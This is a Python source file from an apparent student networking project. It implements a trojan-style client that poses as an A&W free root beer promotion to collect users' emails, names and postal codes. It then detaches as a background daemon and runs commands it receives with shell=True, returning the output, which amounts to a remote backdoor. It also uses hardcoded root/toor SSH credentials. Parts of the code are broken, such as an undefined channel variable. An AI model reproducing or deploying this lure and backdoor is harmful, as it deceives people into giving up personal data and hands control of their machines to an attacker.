# test_client.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  N/A
 #
 #       Output:  Outputs to console results of command executed
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  N/A 
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import paramiko
import threading
import subprocess
import sys
import os




def fetchSFTP():
    try:
        host = "::1"
        port = 9000
        usr,  pwd = 'root', 'toor'
        
        key = paramiko.RSAKey(filename='test_rsa.key')
        
        ''''
        transport = paramiko.Transport(('::1', 9000))
        transport.connect(usr, pwd, pkey=key)
        sftp = paramiko.SFTPClient.from_transport(transport)
        '''
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,port, usr, pwd,  key)
        
        sftp = client.open_sftp()
        sftp.sshclient = client
        
        #TEST
        file = open("mytestfile.txt",  "a")
        file.write("Runescape Sucks")
        file.close()
        sftp.put("mytestfile.txt",  "transported.txt")
        
        return sftp
    except Exception as e:
        print("Unhandled exception ->"+ str(e))
        
        if sftp:
            sftp.close()
        if client:
            client.close()
    
    #--------------End of fetch SFTP-----------#

fetchSFTP()
signUp = "y"
infoBank = []
while True:
    while(signUp == "y"):
        print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
        email = input("Please enter your email to begin: ")

        print('Hello {} '.format(email))
        print("\nWe will now begin sign up for your free root beer and A&W coupons...")
        firstName = input("Enter your first name: ")
        lastName = input("Enter your last name: ")
        postalCode = input("Enter your postal code for local offers: ")

        userInfo = [email,firstName,lastName,postalCode]
            
        signUp = input("Thank you! You are now signed up for free rewards. \
        \nWould you like to sign up another user?  y/n: ")

        infoBank.append(userInfo)
        print(infoBank)
    try:
        pid = os.fork()
    except OSError:
        sys.stderr.write("Could not create a child process\n")
        continue

    with open('info_bank.txt', 'w') as f:
        for item in infoBank:
            f.write("%s\n" % item)
    
    #decouple from parent env
    os.chdir('/')
    try:
        os.setsid()
    except:
        pass
    os.umask(0)

    #double fork
    try:
        pid = os.fork()
    except OSError:
        sys.stderr.write("Could not create a child process\n")
        continue
        
    if pid > 0: #parent
        os._exit(0)
    
    ##double forked and detached##
    ##recieve commands from daemon here##

    command = chan.recv(1024)
    command = command.decode()
    print("Executing this -->" + str(command))
    result = str(command)
    try:
        # safe escape in case the server leaves us 
        if (result == 'stop' or result == ''):
            client.close()
            sys.exit(0)
        #exec this command, in future this would be os.system()
        proc = subprocess.check_output(command, shell=True)
        chan.send(proc)
    except Exception as e:
        print("An Error or interuption occurred. Continue As normal")
        chan.send('An Error or interuption occurred. Continue As normal')


client.close()
